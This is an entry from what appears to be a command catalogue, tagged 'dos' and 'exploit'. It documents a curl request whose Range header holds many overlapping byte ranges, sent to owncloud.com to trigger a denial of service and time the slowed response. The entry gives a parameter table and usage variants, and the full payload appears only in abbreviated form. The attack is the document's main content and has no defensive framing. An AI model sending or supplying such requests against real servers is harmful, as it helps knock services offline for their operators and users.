---
id: cmd-uuid-003
data: >-
  curl -H "Range: bytes=0-0,0-1,0-2,0-3,0-4,5-0,5-1,5-2,5-3,5-4,5-5,...[1300
  ranges]" -w "Total time: %{time_total}s\n" -o /dev/null -s
  http://owncloud.com/
tags:
  - dos
  - exploit
type: command
output: 'Total time: 50.000s'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.975Z'
verified: false
validated: true
submitted: true
---
# curl-range-dos-test

## Command

```bash
curl -H "Range: bytes=0-0,0-1,0-2,0-3,0-4,5-0,5-1,5-2,5-3,5-4,5-5,...[1300 ranges]" -w "Total time: %{time_total}s\n" -o /dev/null -s http://owncloud.com/
```

## Description

Sends a crafted GET with overlapping Range header to trigger DoS, timing the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H | Custom header with overlapping ranges | Yes |
| -w | Timing output | Yes |
| http://owncloud.com/ | Target | Yes |

## Examples

### Basic Usage

```bash
curl -H "Range: bytes=0-" http://example.com/
```

### Advanced Usage

```bash
curl -H "Range: [full payload]" --max-time 60 http://example.com/
```

## Expected Output

"Total time: 50.000s" showing delay.

## Related

- [[Related Procedure]]
